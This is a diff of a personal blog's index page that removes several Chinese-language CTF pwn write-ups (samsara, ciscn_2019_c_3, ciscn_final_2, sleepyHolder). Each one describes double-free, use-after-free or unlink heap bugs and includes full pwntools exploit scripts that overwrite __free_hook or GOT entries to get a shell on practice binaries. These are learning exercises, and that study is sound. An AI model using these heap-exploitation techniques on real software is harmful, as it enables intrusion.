+    root.mainloop()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2023/12/25/python课设/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
       <a href="/2023/12/06/sctf2019-easy-heap/" class="item-title">sctf2019_easy_heap</a>
       
       <time datetime="2023-12-06T13:15:49.000Z">
@@ -276,558 +796,6 @@ p.interactive()
         </div>
 
         
-    
-    <div class="recent-post-item">
-
-      <a href="/2023/12/03/metasequoia-2020-samsara/" class="item-title">metasequoia_2020_samsara</a>
-      
-      <time datetime="2023-12-03T08:02:58.000Z">
-        2023-12-03
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 保护全开，就不放了程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag
-先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef
-
-开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意expfrom pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,28766)
-p=process(&quot;./metasequoia_2020_samsara&quot;)
-context.log_level=&quot;debug&quot;
-
-libc=ELF(&#39;./libc-2.23.so&#39;)
-
-def add():
-    p -->
-        <!-- </div> -->
-
-        
-        <h5 id="保护全开，就不放了"><a href="#保护全开，就不放了" class="headerlink" title="保护全开，就不放了"></a>保护全开，就不放了</h5><h5 id="程序挺简单的，菜单直接放出来了，存在double-free漏洞，只需要让v8-0xdeadbeef就能拿到flag"><a href="#程序挺简单的，菜单直接放出来了，存在double-free漏洞，只需要让v8-0xdeadbeef就能拿到flag" class="headerlink" title="程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag"></a>程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag</h5><p><img src="https://i.imgs.ovh/2023/12/03/wSene.png" alt=""></p>
-<h5 id="先double-free-然后用case4打印出v7的地址，在栈上v8的地址等于v7-0x8-double-free改地址的时候改到v7-0x8-然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8-0x10的地方写上0xdeadbeef"><a href="#先double-free-然后用case4打印出v7的地址，在栈上v8的地址等于v7-0x8-double-free改地址的时候改到v7-0x8-然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8-0x10的地方写上0xdeadbeef" class="headerlink" title="先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef"></a>先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef</h5><p><img src="https://i.imgs.ovh/2023/12/03/wukUH.png" alt="image-20231203164238201"></p>
-<p><img src="https://i.imgs.ovh/2023/12/03/wu1MT.png" alt="image-20231203165112607"></p>
-<h5 id="开始的时候得多申请一个堆堆3，其他师傅说防止free-掉的两个chunk和top-chunk合并，脚本跑的话没逝，但以后还是得注意"><a href="#开始的时候得多申请一个堆堆3，其他师傅说防止free-掉的两个chunk和top-chunk合并，脚本跑的话没逝，但以后还是得注意" class="headerlink" title="开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意"></a>开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,28766)
-p=process(&quot;./metasequoia_2020_samsara&quot;)
-context.log_level=&quot;debug&quot;
-
-libc=ELF(&#39;./libc-2.23.so&#39;)
-
-def add():
-    p.sendlineafter(&#39;choice &gt; &#39;,&#39;1&#39;)
-
-def free(index):
-    p.sendlineafter(&#39;choice &gt; &#39;,&#39;2&#39;)
-    p.sendlineafter(&#39;Index&#39;,str(index))
-
-def full(index,content):
-    p.sendlineafter(&#39;choice &gt; &#39;,&#39;3&#39;)
-    p.sendlineafter(&#39;Index&#39;,str(index))
-    p.sendlineafter(&#39;Ingredient:&#39;,content)
-
-def show():
-    p.sendlineafter(&#39;choice &gt; &#39;,&#39;4&#39;)
-
-def move(content):
-    p.sendlineafter(&#39;choice &gt; &#39;,&#39;5&#39;)
-    p.sendlineafter(&#39;Which kingdom?&#39;,content)
-
-add() #0
-add() #1
-add() #2
-free(0)
-free(1)
-free(0)
-show()
-
-p.recvuntil(&#39;Your lair is at: &#39;)
-addr=int(p.recv(14),16)
-#addr = int(p.recvuntil(&#39;\n&#39;, drop=True), 16)
-print(&#39;addr=&gt;&#39;+hex(addr))
-move(str(0x20))
-gdb.attach(p)
-pause()
-#sleep(1)
-
-
-v8=addr-0x8
-add() #3
-full(3,str(v8))
-add() #4
-add() #5
-
-add() #6
-
-full(6,str(0xdeadbeef))
-
-p.sendlineafter(&#39;choice &gt; &#39;,&#39;6&#39;)
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2023/12/03/metasequoia-2020-samsara/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2023/11/27/ciscn-2019-c-3/" class="item-title">ciscn_2019_c_3</a>
-      
-      <time datetime="2023-11-27T13:21:21.000Z">
-        2023-11-27
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 
-开启了全局偏移add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数
-show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址
-delete函数，存在很明显的UAF漏洞
-还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针
-先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆add(0x100,&#39;aaaa&#39;) #0
-add(0x60,&#39;bbbb&#39;) #1
-for i in range(8):
-    delete(0)
-
-
-然后show的话能接收到其地址show(0)
-
-p.recvuntil(&quot;attack_times: &quot;)
-#arena = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
-arena_96=int(p.recvuntil(&#39;\n&#39;,d -->
-        <!-- </div> -->
-
-        
-        <p><img src="https://i.imgs.ovh/2023/11/27/pnlWA.png" alt="image-20231127212242738"></p>
-<h5 id="开启了全局偏移"><a href="#开启了全局偏移" class="headerlink" title="开启了全局偏移"></a>开启了全局偏移</h5><h5 id="add函数，只允许申请固定的几个大小的堆，在堆地址-16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址-8的地址会加上随机数"><a href="#add函数，只允许申请固定的几个大小的堆，在堆地址-16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址-8的地址会加上随机数" class="headerlink" title="add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数"></a>add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnne5.png" alt="image-20231127212332956"></p>
-<h5 id="show函数，会把堆地址上的几个数分别打印出来，可以打印出main-arena-96的地址"><a href="#show函数，会把堆地址上的几个数分别打印出来，可以打印出main-arena-96的地址" class="headerlink" title="show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址"></a>show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnhGT.png" alt="image-20231127213053713"></p>
-<h5 id="delete函数，存在很明显的UAF漏洞"><a href="#delete函数，存在很明显的UAF漏洞" class="headerlink" title="delete函数，存在很明显的UAF漏洞"></a>delete函数，存在很明显的UAF漏洞</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnb8d.png" alt="image-20231127213159824"></p>
-<h5 id="还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针"><a href="#还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针" class="headerlink" title="还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针"></a>还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnSAK.png" alt="image-20231127213350417"></p>
-<h5 id="先malloc大小为0x100的堆，然后释放8次，然后bin才会有main-arena-96-且得先malloc大小是0x100大小的堆"><a href="#先malloc大小为0x100的堆，然后释放8次，然后bin才会有main-arena-96-且得先malloc大小是0x100大小的堆" class="headerlink" title="先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆"></a>先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆</h5><pre><code class="lang-py">add(0x100,&#39;aaaa&#39;) #0
-add(0x60,&#39;bbbb&#39;) #1
-for i in range(8):
-    delete(0)
-</code></pre>
-<p><img src="https://i.imgs.ovh/2023/11/27/pnJD3.png" alt="image-20231127215520780"></p>
-<h5 id="然后show的话能接收到其地址"><a href="#然后show的话能接收到其地址" class="headerlink" title="然后show的话能接收到其地址"></a>然后show的话能接收到其地址</h5><pre><code class="lang-py">show(0)
-
-p.recvuntil(&quot;attack_times: &quot;)
-#arena = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
-arena_96=int(p.recvuntil(&#39;\n&#39;,drop=True))
-</code></pre>
-<pre><code class="lang-py">malloc_hook=arena_96-96-0x10
-base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
-free_hook=base+libc.sym[&#39;__free_hook&#39;]
-gadget=base+one_gadget
-</code></pre>
-<h5 id="再申请一个堆，这时候会在堆2开始-由于glibc-2-27的特性，会在开始的上方申请堆，这里不太明白为什么要用free-hook-0x10的地址，而不是free-hook"><a href="#再申请一个堆，这时候会在堆2开始-由于glibc-2-27的特性，会在开始的上方申请堆，这里不太明白为什么要用free-hook-0x10的地址，而不是free-hook" class="headerlink" title="再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hook"></a>再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hook</h5><pre><code class="lang-py">payload=p64(0)*2+p64(free_hook-0x10)
-add(0x60,payload) #2
-</code></pre>
-<p><img src="https://i.imgs.ovh/2023/11/27/pnGZ0.png" alt="image-20231127221735133"></p>
-<h5 id="double-free然后用backdoor函数20次，fd-0x20-将bin指针指向0x0000562a77ab5280的地址"><a href="#double-free然后用backdoor函数20次，fd-0x20-将bin指针指向0x0000562a77ab5280的地址" class="headerlink" title="double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址"></a>double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnNKC.png" alt="image-20231127221921315"></p>
-<p><img src="https://i.imgs.ovh/2023/11/27/pnajt.png" alt="image-20231127222235671"></p>
-<pre><code class="lang-py">add(0x60,&#39;aaaa&#39;)
-add(0x60,&#39;bbbb&#39;)
-add(0x60,p64(gadget))
-delete(1)
-</code></pre>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,29798)
-p=process(&quot;./ciscn_2019_c_3&quot;)
-context.log_level=&quot;debug&quot;
-libc=ELF(&#39;./libc-2.27.so&#39;)
-context.arch=&#39;amd64&#39;
-
-one_gadget=0x4f322
-def add(size,content):
-    p.sendlineafter(&#39;Command: &#39;,&#39;1&#39;)
-    p.sendlineafter(&#39;size: &#39;,str(size))
-    p.sendlineafter(&#39;Give me the name: &#39;,content)
-
-def show(index):
-    p.sendlineafter(&#39;Command: &#39;,&#39;2&#39;)
-    p.sendlineafter(&#39;index: &#39;,str(index))
-
-def delete(index):
-    p.sendlineafter(&#39;Command: &#39;,&#39;3&#39;)
-    p.sendlineafter(&#39;weapon:&#39;,str(index))
-
-def back(index):
-    p.sendlineafter(&#39;Command: &#39;,&#39;666&#39;)
-    p.sendlineafter(&#39;weapon:&#39;,str(index))
-
-
-
-add(0x100,&#39;aaaa&#39;) #0
-add(0x60,&#39;bbbb&#39;) #1
-
-for i in range(8):
-    delete(0)
-
-show(0)
-
-p.recvuntil(&quot;attack_times: &quot;)
-#arena = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
-arena_96=int(p.recvuntil(&#39;\n&#39;,drop=True))
-malloc_hook=arena_96-96-0x10
-
-base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
-free_hook=base+libc.sym[&#39;__free_hook&#39;]
-gadget=base+one_gadget
-
-
-payload=p64(0)*2+p64(free_hook-0x10)#2
-add(0x60,payload)
-
-delete(2)
-delete(2)
-
-
-for i in range(0x20):
-    back(2)
-gdb.attach(p)
-sleep(1)
-add(0x60,&#39;aaaa&#39;)
-add(0x60,&#39;bbbb&#39;)
-print(hex(free_hook))
-
-add(0x60,p64(gadget))
-
-delete(1)
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2023/11/27/ciscn-2019-c-3/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2023/11/02/ciscn-final-2/" class="item-title">ciscn_final_2</a>
-      
-      <time datetime="2023-11-02T14:07:31.000Z">
-        2023-11-02
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 例行检查，保护全开，就不放了。add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放
-存在double free漏洞
-可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。
-前戏是先double free改堆头的size，改size容易但是中间得add好几个堆add(1,&#39;11&#39;)
-dele(1)
-add(2,&#39;22&#39;)
-add(2,&#39;11&#39;)
-add(2,&#39;11&#39;)
-add(2,&#39;22&#39;)
-dele(2)
-add(1,&#39;11&#39;)
-dele(2)
-show(2)
-p.recvuntil(&#39;your short type inode number :&#39;)
-addr=int(p.recvuntil(&#39;\n&#39;, drop=True))-0xa0
-
-add(2,addr)
-add(2,&#39;11&#39; -->
-        <!-- </div> -->
-
-        
-        <h5 id="例行检查，保护全开，就不放了。"><a href="#例行检查，保护全开，就不放了。" class="headerlink" title="例行检查，保护全开，就不放了。"></a>例行检查，保护全开，就不放了。</h5><h5 id="add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放"><a href="#add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放" class="headerlink" title="add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放"></a>add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZX3dv.png" alt="image-20231102221044737"></p>
-<h5 id="存在double-free漏洞"><a href="#存在double-free漏洞" class="headerlink" title="存在double free漏洞"></a>存在double free漏洞</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXmFe.png" alt="image-20231102221330585"></p>
-<h5 id="可以double-free泄露出堆地址，但是是int类型，接收的话用addr-int-p-recvuntil-‘-n’-drop-True-发送的时候用str类型就可在内存里用十六进制存储了。"><a href="#可以double-free泄露出堆地址，但是是int类型，接收的话用addr-int-p-recvuntil-‘-n’-drop-True-发送的时候用str类型就可在内存里用十六进制存储了。" class="headerlink" title="可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。"></a>可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXwuW.png" alt="image-20231102221416344"></p>
-<h5 id="前戏是先double-free改堆头的size，改size容易但是中间得add好几个堆"><a href="#前戏是先double-free改堆头的size，改size容易但是中间得add好几个堆" class="headerlink" title="前戏是先double free改堆头的size，改size容易但是中间得add好几个堆"></a>前戏是先double free改堆头的size，改size容易但是中间得add好几个堆</h5><pre><code class="lang-py">add(1,&#39;11&#39;)
-dele(1)
-add(2,&#39;22&#39;)
-add(2,&#39;11&#39;)
-add(2,&#39;11&#39;)
-add(2,&#39;22&#39;)
-dele(2)
-add(1,&#39;11&#39;)
-dele(2)
-show(2)
-p.recvuntil(&#39;your short type inode number :&#39;)
-addr=int(p.recvuntil(&#39;\n&#39;, drop=True))-0xa0
-
-add(2,addr)
-add(2,&#39;11&#39;)
-add(2,0x91) #改掉size
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2023/11/02/ZXhGo.png" alt="image-20231102222318910"></p>
-<h5 id="free7次使其进入unsortedbin-前面改size成0x90是最小的大小，不然下面的地址不会是main-arena-96"><a href="#free7次使其进入unsortedbin-前面改size成0x90是最小的大小，不然下面的地址不会是main-arena-96" class="headerlink" title="free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96"></a>free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96</h5><pre><code class="lang-py">for i in range(7):
-    dele(1)
-    add(2,5)
-
-dele(1)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2023/11/02/ZXKu5.png" alt="image-20231102223102271"></p>
-<h5 id="接收并计算地址-至于为什么是-IO-2-1-stdin-0x70，应该是它执行时候的地址。"><a href="#接收并计算地址-至于为什么是-IO-2-1-stdin-0x70，应该是它执行时候的地址。" class="headerlink" title="接收并计算地址,至于为什么是 IO_2_1_stdin +0x70，应该是它执行时候的地址。"></a>接收并计算地址,至于为什么是 <em>IO_2_1_stdin </em>+0x70，应该是它执行时候的地址。</h5><pre><code class="lang-py">show(1)
-p.recvuntil(&#39;your int type inode number :&#39;)
-malloc_hook=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x70
-base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
-stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70
-</code></pre>
-<h5 id="再次malloc改掉堆地址-然后填充"><a href="#再次malloc改掉堆地址-然后填充" class="headerlink" title="再次malloc改掉堆地址,然后填充"></a>再次malloc改掉堆地址,然后填充</h5><pre><code class="lang-py">add(1,stdin)
-add(1,0x30)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2023/11/02/ZXSAX.png" alt="image-20231102223851495"></p>
-<h5 id="再次double-free获取头地址，再次show出来的堆头地址和开始时的时不一样的。"><a href="#再次double-free获取头地址，再次show出来的堆头地址和开始时的时不一样的。" class="headerlink" title="再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。"></a>再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。</h5><pre><code class="lang-py">dele(1)
-add(2,0x30)
-dele(1) #double free
-
-show(1)
-p.recvuntil(&#39;your int type inode number :&#39;)
-chunk0=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x30
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2023/11/02/ZXRWt.png" alt="image-20231102224535159"></p>
-<h5 id="再改堆指针-填充"><a href="#再改堆指针-填充" class="headerlink" title="再改堆指针,填充"></a>再改堆指针,填充</h5><pre><code class="lang-py">add(1,chunk0)
-add(1,chunk0)
-add(1,111)
-add(1,666)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2023/11/02/ZXcgm.png" alt="image-20231102224934035"></p>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *
-from LibcSearcher import *
-p=process(&#39;./ciscn_final_2&#39;)
-#p=remote(&#39;node4.buuoj.cn&#39;,26681)
-context( os = &#39;linux&#39;,arch=&#39;amd64&#39;)
-context.log_level = &#39;debug&#39;
-elf=ELF(&#39;./ciscn_final_2&#39;)
-libc=ELF(&#39;./libc-2.27.so&#39;)
-def add(index,content):
-    p.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)
-    p.sendlineafter(&#39;&gt;&#39;,str(index))
-    p.sendlineafter(&#39;your inode number:&#39;,str(content))
-
-def dele(index):
-    p.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;)
-    p.sendlineafter(&#39;&gt;&#39;,str(index))
-
-def show(index):
-    p.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)
-    p.sendlineafter(&#39;&gt;&#39;,str(index))
-
-add(1,&#39;11&#39;)
-dele(1)
-add(2,&#39;22&#39;)
-add(2,&#39;11&#39;)
-add(2,&#39;11&#39;)
-add(2,&#39;22&#39;)
-dele(2)
-add(1,&#39;11&#39;)
-dele(2)
-show(2)
-p.recvuntil(&#39;your short type inode number :&#39;)
-addr=int(p.recvuntil(&#39;\n&#39;, drop=True))-0xa0
-
-add(2,addr)
-add(2,&#39;11&#39;)
-add(2,0x91)
-
-for i in range(7):
-    dele(1)
-    add(2,5)
-
-dele(1)
-
-show(1)
-p.recvuntil(&#39;your int type inode number :&#39;)
-malloc_hook=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x70
-base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
-stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70
-
-add(1,stdin)  ###???
-add(1,0x30)
-
-#double free
-
-dele(1)
-add(2,0x30)
-dele(1)
-
-
-show(1)
-p.recvuntil(&#39;your int type inode number :&#39;)
-chunk0=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x30
-add(1,chunk0)
-gdb.attach(p)
-sleep(1)
-add(1,chunk0)
-add(1,111)
-add(1,666)
-
-p.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)
-p.recvuntil(&#39;your message :&#39;)
-
-#print(addr)
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2023/11/02/ciscn-final-2/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2023/10/30/sleepyHolder-hitcon-2016/" class="item-title">sleepyHolder_hitcon_2016</a>
-      
-      <time datetime="2023-10-30T12:09:08.000Z">
-        2023-10-30
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 例行检查
-add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次
-dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆
-这还有个edit函数
-add(1,&#39;AAAA&#39;) #堆0
-add(2,&#39;BBBB&#39;) #堆1
-
-dele(1)
-add(3,&#39;cccc&#39;) #堆2
-
-因为堆2太大所以free chunk会放在smallbin里
-这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink
-再申请一次堆add(1,&#39;aaaa&#39;)
-
-
-后面构造fake_chunk,然后dele(2),会unlinkpayload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)
-edit(1,payload)
-dele(2) #unlink
-
-
-注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有 -->
-        <!-- </div> -->
-
-        
-        <h5 id="例行检查"><a href="#例行检查" class="headerlink" title="例行检查"></a>例行检查</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AS5sW.png" alt=""></p>
-<h5 id="add函数，能分别申请一个0x28，0xfa0-0x61a80大小的堆一次"><a href="#add函数，能分别申请一个0x28，0xfa0-0x61a80大小的堆一次" class="headerlink" title="add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次"></a>add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASi8V.png" alt="image-20231031212602644"></p>
-<h5 id="dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆"><a href="#dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆" class="headerlink" title="dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆"></a>dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆</h5><p><img src="https://i0.imgs.ovh/2023/10/30/AfdAt.png" alt="image-20231030201715281"></p>
-<h5 id="这还有个edit函数"><a href="#这还有个edit函数" class="headerlink" title="这还有个edit函数"></a>这还有个edit函数</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASteK.png" alt="image-20231030204040558"></p>
-<pre><code class="lang-py">add(1,&#39;AAAA&#39;) #堆0
-add(2,&#39;BBBB&#39;) #堆1
-
-dele(1)
-add(3,&#39;cccc&#39;) #堆2
-</code></pre>
-<h5 id="因为堆2太大所以free-chunk会放在smallbin里"><a href="#因为堆2太大所以free-chunk会放在smallbin里" class="headerlink" title="因为堆2太大所以free chunk会放在smallbin里"></a>因为堆2太大所以free chunk会放在smallbin里</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Ah5hd.png" alt="image-20231031172733305"></p>
-<h5 id="这里有个漏洞，double-free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink"><a href="#这里有个漏洞，double-free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink" class="headerlink" title="这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink"></a>这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Asbk2.png" alt="image-20231031173201803"></p>
-<h5 id="再申请一次堆"><a href="#再申请一次堆" class="headerlink" title="再申请一次堆"></a>再申请一次堆</h5><pre><code class="lang-py">add(1,&#39;aaaa&#39;)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2023/10/31/ASOFp.png" alt="image-20231030220449382"></p>
-<h5 id="后面构造fake-chunk-然后dele-2-会unlink"><a href="#后面构造fake-chunk-然后dele-2-会unlink" class="headerlink" title="后面构造fake_chunk,然后dele(2),会unlink"></a>后面构造fake_chunk,然后dele(2),会unlink</h5><pre><code class="lang-py">payload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)
-edit(1,payload)
-dele(2) #unlink
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2023/10/31/As5D5.png" alt="image-20231031173510102"></p>
-<h5 id="注意堆0时0x6020d0-堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0-d8-dc的地址-有则表示1-堆1虽已dele，但是只是为了后面方便改指针，全都写成1"><a href="#注意堆0时0x6020d0-堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0-d8-dc的地址-有则表示1-堆1虽已dele，但是只是为了后面方便改指针，全都写成1" class="headerlink" title="注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1"></a>注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1</h5><pre><code class="lang-py">payload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1)
-edit(1,payload)  #8
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2023/10/31/Axq5v.png" alt="image-20231031175111527"></p>
-<pre><code>edit(2,p64(0x400760))  #put_plt
-edit(1,p64(0x602020))  #puts_got
-</code></pre><h5 id="把free-got改写的内容改成puts-plt-可以执行puts函数，堆0的指针写上puts-got-然后dele堆1，就会打印出地址"><a href="#把free-got改写的内容改成puts-plt-可以执行puts函数，堆0的指针写上puts-got-然后dele堆1，就会打印出地址" class="headerlink" title="把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址"></a>把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AxaJ9.png" alt="image-20231031175406206"></p>
-<h5 id="然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0"><a href="#然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0" class="headerlink" title="然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0"></a>然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0</h5><pre><code class="lang-py">payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1)
-edit(1,payload)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2023/10/31/AKQhe.png" alt="image-20231031180043302"></p>
-<h5 id="再edit堆2，写上system的地址，"><a href="#再edit堆2，写上system的地址，" class="headerlink" title="再edit堆2，写上system的地址，"></a>再edit堆2，写上system的地址，</h5><pre><code class="lang-py">edit(2,p64(system))
-</code></pre>
